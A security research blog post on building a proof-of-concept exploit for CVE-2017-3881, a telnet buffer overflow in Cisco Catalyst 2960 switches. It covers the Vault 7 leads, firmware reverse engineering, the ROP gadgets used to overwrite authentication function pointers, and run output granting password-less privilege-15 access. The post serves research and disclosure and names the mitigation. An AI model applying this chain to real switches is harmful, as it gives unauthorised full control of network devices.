---
layout: post
comments: true
title: "CVE-2017-3881 Cisco Catalyst RCE Proof-Of-Concept"
description: "Digging deep into CIA Vault 7 documents to craft Proof-Of-Concept remote code execution for Cisco Catalyst switches"
---

Do you still have telnet enabled on your Catalyst switches? Think twice, here's a proof-of-concept remote code execution exploit for Catalyst 2960 switch with latest suggested firmware. Check out the exploit code [here](https://github.com/artkond/cisco-rce/). What follows is a detailed write-up of the exploit development process for the vulnerability leaked from CIA's archive on March 7th 2017 and publicly disclosed by Cisco Systems on March 17th 2017. At the time of writing this post there is no patch available. Nonetheless there is a remidiation - disable telnet and use SSH instead.
<!-- more -->

## Vault 7 CIA leak

A series of CIA's documents were leaked on March 7th 2017 and [published](https://wikileaks.org/ciav7p1/) on WikiLeaks. Among other publications there was an interesting preauth code execution vulnerability that affected multiple Cisco switches. This vulnerability is code-named [ROCEM](https://wikileaks.org/ciav7p1/cms/page_20250772.html) in the leaked documents. Although very few technical details were mentioned, few things stand out.

The Vault 7's documents shed a light on the testing process for the actual exploit. No exploit source code is available in the leak. Two use cases are highlighted there - the tool can be launched in either interactive mode or set mode. The interactive mode sends the payload via telnet and immeditely presents the attacker with command shell in the context of the same telnet connection. Quote from the [doc](https://wikileaks.org/ciav7p1/cms/page_23134373.html):

```
Started ROCEM interactive session - successful:

root@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -i 192.168.0.254
[+] Validating data/interactive.bin
[+] Validating data/set.bin
[+] Validating data/transfer.bin
[+] Validating data/unset.bin
****************************************
Image: c3560-ipbase-mz.122-35.SE5
Host: 192.168.0.254
Action: Interactive
****************************************
Proceed? (y/n)y
Trying 127.0.0.1...
[*] Attempting connection to host 192.168.0.254:23
Connected to 127.0.0.1.
Escape character is '^]'.
[+] Connection established
[*] Starting interactive session
User Access Verification
Password:
MLS-Sth#

MLS-Sth# show priv
Current privilege level is 15
MLS-Sth#show users
Line User Host(s) Idle Location
* 1 vty 0 idle 00:00:00 192.168.221.40
Interface User Mode Idle Peer Address
MLS-Sth#exit
Connection closed by foreign host.
```

Set mode. Modify switch memory in order to make any     
subsequent telnet connections passwordless. Quote from the [doc](https://wikileaks.org/ciav7p1/cms/page_24969226.html):

```
Test set/unset feature of ROCEM
DUT configured with target configuration and network setup
DUT is accessed by hopping through three flux nodes as per the CONOP
Reloaded DUT to start with a clean device
From Adverse ICON machine, set ROCEM:
root@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -s 192.168.0.254
[+] Validating data/interactive.bin
[+] Validating data/set.bin
[+] Validating data/transfer.bin
[+] Validating data/unset.bin

****************************************
Image: c3560-ipbase-mz.122-35.SE5
Host: 192.168.0.254
Action: Set
****************************************

Proceed? (y/n)y
[*] Attempting connection to host 192.168.0.254:23
[+] Connection established
[*] Sending Protocol Step 1
[*] Sending Protocol Step 2
[+] Done
root@debian:/home/user1/ops/adverse/adverse-1r/rocem#

Verified I could telnet and rx priv 15 without creds:

root@debian:/home/user1/ops/adverse/adverse-1r/rocem# telnet 192.168.0.254
Trying 192.168.0.254...
Connected to 192.168.0.254.
Escape character is '^]'.

MLS-Sth#

MLS-Sth#show priv
Current privilege level is 15
MLS-Sth#
```

One piece of information being useful for me in researching this vulnerability was a telnet debug output. Quote from the [doc](https://wikileaks.org/ciav7p1/cms/page_17760327.html):

```
14. Confirm Xetron EAR 5355 - Debug telnet causes anomalous output 
  1.Enabled debug telnet on DUT
  2.Set ROCEM
  3.Observed the following:
    000467: Jun 3 13:54:09.330: TCP2: Telnet received WILL TTY-SPEED (32) (refused)
    000468: Jun 3 13:54:09.330: TCP2: Telnet sent DONT TTY-SPEED (32)
    000469: Jun 3 13:54:09.330: TCP2: Telnet received WILL LOCAL-FLOW (33) (refused)
    000470: Jun 3 13:54:09.330: TCP2: Telnet sent DONT LOCAL-FLOW (33)
    000471: Jun 3 13:54:09.330: TCP2: Telnet received WILL LINEMODE (34)
    000472: Jun 3 13:54:09.330: TCP2: Telnet sent DONT LINEMODE (34) (unimplemented)
    000473: Jun 3 13:54:09.330: TCP2: Telnet received WILL NEW-ENVIRON (39)
    000474: Jun 3 13:54:09.330: TCP2: Telnet sent DONT NEW-ENVIRON (39) (unimplemented)
    000475: Jun 3 13:54:09.330: TCP2: Telnet received DO STATUS (5)
    000476: Jun 3 13:54:09.330: TCP2: Telnet sent WONT STATUS (5) (unimplemented)
    000477: Jun 3 13:54:09.330: TCP2: Telnet received WILL X-DISPLAY (35) (refused)
    000478: Jun 3 13:54:09.330: TCP2: Telnet sent DONT X-DISPLAY (35)
    000479: Jun 3 13:54:09.330: TCP2: Telnet received DO ECHO (1)
    000480: Jun 3 13:54:09.330: Telnet2: recv SB NAWS 116 29
    000481: Jun 3 13:54:09.623: Telnet2: recv SB 36 92 OS^K'zAuk,Fz90X
    000482: Jun 3 13:54:09.623: Telnet2: recv SB 36 0 ^CCISCO_KITS^Ap
```

Note the `CISCO_KITS` option received by the service on the last line. This prooved to be an important string.

## Cisco advisory

On March 17th 2017 Cisco Systems [disclosed](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp) a vulnerability present in their switches. This diclosure was based on the documents from Vault 7:

> A vulnerability in the Cisco Cluster Management Protocol (CMP) processing code in Cisco IOS and Cisco IOS XE Software could allow an unauthenticated, remote attacker to cause a reload of an affected device or remotely execute code with elevated privileges.

Not much details were available at the time of writing this article, except for the following paragraph:

> The Cluster Management Protocol utilizes Telnet internally as a signaling and command protocol between cluster members. The vulnerability is due to the combination of two factors:
> - The failure to restrict the use of CMP-specific Telnet options only to internal, local communications between cluster members and instead accept and process such options over any Telnet connection to an affected device, and
> - The incorrect processing of malformed CMP-specific Telnet options.

Long story short, the vulnerability allows the attacker to exploit telnet service to gain remote code execution on the target switch. But in order to make any use of this advisory I needed more information on the matter. So I decided dig deeper into Cisco Cluster Management Protocol.

## Switch clustering

All right! I had two Catalyst 2960 switches for researching this vulnerability. Clustering sets a master-slave relation between switches. Master switch is able to get a privileged command shell on the slave. As Cisco mentioned in its adivisory, telnet is used as a command protocol between cluster members. Some info on clustering can be found [here](http://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst3750x_3560x/software/release/12-2_55_se/configuration/guide/3750xscg/swclus.pdf) and [here's](https://slaptijack.com/networking/cisco-catalyst-configuration-using-cluster-commands/) an example of setting up a cluster environment.

Now to look for cluster traffic between them. The following should be in the master switch config:

```
cluster enable CLGRP 0
cluster member 1 mac-address xxxx.xxxx.xxxx
```

This will add a nearby switch as a cluster slave. `rcommand <num>` allows to get command interface on a slave switch from the master's interface. This is expected by design.

```
catalyst1>rcommand 1
catalyst2>who
    Line       User       Host(s)              Idle       Location
*  1 vty 0                idle                 00:00:00 10.10.10.10

  Interface      User        Mode                     Idle     Peer Address
```

Let's look at the traffic generated by `rcommand`:

![llc]({{ site.url }}/assets/cisco/llc_traffic.png)

Hey! Where da hell is telnet traffic? Advisory clearly states:

> The Cluster Management Protocol utilizes Telnet internally as a signaling and command protocol between cluster members.

Ok, running `show version` to see some more traffic:
```
catalyst2>show version
Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(55)SE1, RELEASE SOFTWARE (fc1)
```

Aha! Telnet traffic is actualy being incapsulated into layer 2 LLC packet. If we look close enough we will notice IP packets inside with chopped MAC addresses at source and destination fields. Inside those "IP" packets reside valid TCP frames with a telnet session.

![show version in cluster traffic]({{ site.url }}/assets/cisco/show_ver_cluster.png)

A telnet session is usually preceded by negotiating telnet options. Among them are: terminal size, terminal type etc. Take a look at the [RFC](https://tools.ietf.org/html/rfc854) for more info. 

Right before being presented with the welcome `catalyst2>` message an interesting telnet option is transfered to the server side:

![cluster magic string option]({{ site.url }}/assets/cisco/cisco_kits_traffic.png)

Here you can see a telnet option "CISCO_KITS" sent from the master switch to the slave. The very same string present in the Vault 7 documents during the execution of exploit. Time to take a closer look at the switch internals.

## Peeking at firmware

Firmware is located at `flash:<version>.bin` on the switch.

```
catalyst2#dir flash:
Directory of flash:/

    2  -rwx     9771282   Mar 1 1993 00:13:28 +00:00  c2960-lanbasek9-mz.122-55.SE1.bin
    3  -rwx        2487   Mar 1 1993 00:01:53 +00:00  config.text
```

Built-in ftp client allows to transfer this firmware to an arbitrary ftp server. Ok, now to analyze and extract contents of the file with [binwalk](https://github.com/devttys0/binwalk):

```
$ binwalk -e c2960-lanbasek9-mz.122-55.SE1.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
112           0x70            bzip2 compressed data, block size = 900k
```

In order to facilitate static analisys of the resulting binary we better know the firmware load offset. This offset is printed to serial console during boot process:

```
Loading "flash:c2960-lanbasek9-mz.122-55.SE1.bin"...@@@@@@@@@@@@@@@@@@@@@@
File "flash:c2960-lanbasek9-mz.122-55.SE1.bin" uncompressed and installed,
entry point: 0x3000
executing...
```

Fire up IDA and let's roll. CPU architecture is PowerPC 32-bit BigEndian. Load the binary at 0x3000:

![ida offset]({{ site.url }}/assets/cisco/ida_offset.png)

### Discovering strings

Remember the `CISCO_KITS` string in the cluser traffic I captured before? This was my starting point. After discovering most of the functions in IDA, I was able to see the cross-refrences to the strings located at the end of firmware. 

![ida cisco kits string]({{ site.url }}/assets/cisco/ida_cisco_kits.png)

"CISCO_KITS" string is referenced by `return_cisco_kits` function, which just returns this string as `char *`. We will focus out attention on on the `call_cisco_kits` function at `0x0004ED8C` which calls `return_cisco_kits`.

![ida proximity]({{ site.url }}/assets/cisco/ida_proximity1.png)

Because telnet code is rather symmetrical for client and server here we actually can see the format of the buffer that is being sent to the server side - `%c%s%c%d:%s:%d:`. This actually goes in line with the observed traffic where the sent buffer was `\x03CISCO_KITS\x012::1:`

```c
if ( telnet_struct->is_client_mode ) // client mode? then send "CISCO_KITS" string
{
    if ( telnet_struct->is_client_mode == 1 )
    {
      cisco_kits_string_2 = (char *)return_cisco_kits();
      int_two = return_2();
      tty_str = get_from_tty_struct((telnet_struct *)telnet_struct_arg->tty_struct);
      *(_DWORD *)&telnet_struct_arg->tty_struct[1].field_6D1;
      format1_ret = format_1(
                               128,
                               (int)&str_buf[8],
                               "%c%s%c%d:%s:%d:",
                               3,
                               cisco_kits_string_2,
                               1,
                               int_two,
                               tty_str,
                               0);
      telnet_struct = (telnet_struct *)telnet_send_sb(
                                         (int)telnet_struct_arg,
                                         36,
                                         0,
                                         &str_buf[8],
                                         format1_ret,
                                         v8,
                                         v7,
                                         v6);
    }
}
```

Notice something? There are two `%s` string modifiers but only one string is actually present in the traffic sample which is `CISCO_KITS`, the second one is empty and is confined between two `:` chars. Further observing the control flow of the very same function I noticed some funny behaviour when dealing with the second string (this time the server-side portion of the code):

```c
for ( j = (unsigned __int8)*string_buffer; j != ':'; j = (unsigned __int8)*string_buffer )// put data before second ":" at &str_buf + 152
{
    str_buf[v19++ + 152] = j;
    ++string_buffer;
}
```

The data we sent over in the second %s string is actually copied until `:` char without checking the destination boundaries while the target buffer resides on the stack. What does this look like? Correct! ~~Buffalo~~ buffer overflow!

![buffalo overflow]({{ site.url }}/assets/cisco/buffalo_overflow.png)

## Getting code execution

Getting control of the instruction pointer was easy as it was overwritten with the buffer I sent (btw I used [IODIDE](https://github.com/nccgroup/IODIDE) for debugging). The problem was that heap and stack (which resides on the heap) were not executable. My best bet is that this is actually the effect of data and instruction caches enabled. Here's a slide from Felix Lindner's [presentation](https://www.blackhat.com/presentations/bh-usa-09/LINDNER/BHUSA09-Lindner-RouterExploit-SLIDES.pdf) at BlackHat 2009:

![powerpc caches]({{ site.url }}/assets/cisco/caches.png)

### ROPing a way out

Since there wasn't a way to execute code on the stack I had to use it as a data buffer and reuse existing code in the firmware. The idea is to chain function epilogs in a meaningful way to perform arbitary memory writes. But wait, write what? Take a look at the decompiled function at `0x00F47A34`:

```c
if ( ptr_is_cluster_mode(tty_struct_var->telnet_struct_field) )
{
  telnet_struct_var = tty_struct_var->telnet_struct_field;
  ptr_get_privilege_level = (int (__fastcall *)(int))some_libc_func(0, (unsigned int *)&dword_22659D4[101483]);
  privilege_level = ptr_get_privilege_level(telnet_struct_var);// equals to 1 during rcommand 1
  telnet_struct_1 = tty_struct_var->telnet_struct_field;
  ptr_telnet_related2 = (void (__fastcall *)(int))some_libc_func(1u, (unsigned int *)&dword_22659D4[101487]);
  ptr_telnet_related2(telnet_struct_1);
  *(_DWORD *)&tty_struct_var->privilege_level_field = ((privilege_level << 28) & 0xF0000000 | *(_DWORD *)&tty_struct_var->privilege_level_field & 0xFFFFFFF) & 0xFF7FFFFF;
}
else
{
  //generic telnet session
}
```

Interesting things happen here. First thing to emphasize is that both calls of  `ptr_is_cluster_mode` and `ptr_get_privilege_level` are made indirectly by referencing global variables. Check line at address `0x00F47B60` - `is_cluster_mode` function address is being loaded from dword at `0x01F24A7`. In a similar way the address of `get_privilege_level` is being loaded from `r3` register at `0x00F47B8C`. At this point `r3` contents is a dereferenced pointer residing at address `0x022659D4 + 0x28 + 0xC`.

![Indirect calls]({{ site.url }}/assets/cisco/ida_dis.png)

If the `ptr_is_cluster_mode` call returns non zero and `ptr_get_privilege` call returns a value that differs from -1 we will be presented with a telnet shell without the need to provide any credentials. Variable `privilege_level` is being checked for its value further down the code:

![privilege level check]({{ site.url }}/assets/cisco/privilege_level_br.png)


What if I could overwrite these function pointers to something that always return the desired positive value? Since stack and heap weren't directly executable I had to reuse the existing code to performs such memory writes. The following [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) gadgets were used:

```nasm
0x000037b4: 
    lwz r0, 0x14(r1)
    mtlr r0
    lwz r30, 8(r1)
    lwz r31, 0xc(r1)
    addi r1, r1, 0x10 
    blr
```

Load `is_cluster_mode` function pointer into `r30`, load the value to overwrite this pointer into `r31`. The value to overwrite is an address of a function that always returns 1:

![return 1 function]({{ site.url }}/assets/cisco/return_1_function.png)


```nasm
0x00dffbe8: 
    stw r31, 0x34(r30)
    lwz r0, 0x14(r1)
    mtlr r0
    lmw r30, 8(r1)
    addi r1, r1, 0x10
    blr
```

Perform the actual write.


```nasm
0x0006788c: 
    lwz r9, 8(r1)
    lwz r3, 0x2c(r9)
    lwz r0, 0x14(r1)
    mtlr r0
    addi r1, r1, 0x10
    blr
```

```nasm
0x006ba128: 
    lwz r31, 8(r1)
    lwz r30, 0xc(r1)
    addi r1, r1, 0x10
    lwz r0, 4(r1)
    mtlr r0
    blr
```

Previous two gadgets load a pointer of `get_privilege_level` function into `r3`, and the value to overwrite it with into `r31`. The target value is a function that returns 15 (could've used this function for both writes tho):

![return 15 function]({{ site.url }}/assets/cisco/return_15_function.png)


```nasm
0x0148e560: 
    stw r31, 0(r3)
    lwz r0, 0x14(r1)
    mtlr r0
    lwz r31, 0xc(r1)
    addi r1, r1, 0x10
    blr
```

This epilog makes the final write and returns to the legitimate execution flow. Of course, stack frame should be formed accordingly to make this rop chain work. Check out the exploit [source](https://github.com/artkond/cisco-rce/blob/master/c2960-lanbasek9-m-12.2.55.se1.py) to see the actual stack layout for this chain to work as intended.

### Running the exploit

At the end of the day I ended up with a tool with the ability to patch function pointers responsible for credless connection and privilege level. Note that the exploit  code is heavily dependent on the exact firmware version used on the switch. Using exploit code for some different firmware most probably will crash the device.

I used the knowledge from static and dynamic analisys of an older firmware SE1 to build an exploit for the latest suggested firmware 12.2(55)SE11. All the difference between firmware versions is different functions and pointers offsets. Also, the way the exploit works makes it easy to revert the changes back. Example:

```
$ python c2960-lanbasek9-m-12.2.55.se11.py 192.168.88.10 --set
[+] Connection OK
[+] Recieved bytes from telnet service: '\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f'
[+] Sending cluster option
[+] Setting credless privilege 15 authentication
[+] All done
$ telnet 192.168.88.10
Trying 192.168.88.10...
Connected to 192.168.88.10.
Escape character is '^]'.

catalyst1#show priv
Current privilege level is 15
catalyst1#show ver
Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(55)SE11, RELEASE SOFTWARE (fc3)
...

System image file is "flash:c2960-lanbasek9-mz.122-55.SE11.bin"

...

cisco WS-C2960-48TT-L (PowerPC405) processor (revision B0) with 65536K bytes of memory.
...
Model number                    : WS-C2960-48TT-L
...

Switch Ports Model              SW Version            SW Image                 
------ ----- -----              ----------            ----------               
*    1 50    WS-C2960-48TT-L    12.2(55)SE11          C2960-LANBASEK9-M        


Configuration register is 0xF

```

To unset this behaviour:

```
$ python c2960-lanbasek9-m-12.2.55.se11.py 192.168.88.10 --unset
[+] Connection OK
[+] Recieved bytes from telnet service: '\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f\r\ncatalyst1#'
[+] Sending cluster option
[+] Unsetting credless privilege 15 authentication
[+] All done
$ telnet 192.168.88.10
Escape character is '^]'.


User Access Verification

Password: 

```

This RCE POC is available [here](https://github.com/artkond/cisco-rce/) for both firware versions. DoS version of this exploit is [available](https://github.com/artkond/cisco-rce/blob/master/ios_telnet_rocem.rb) as a metasploit module, it might work for most models mentioned in the Cisco advisory.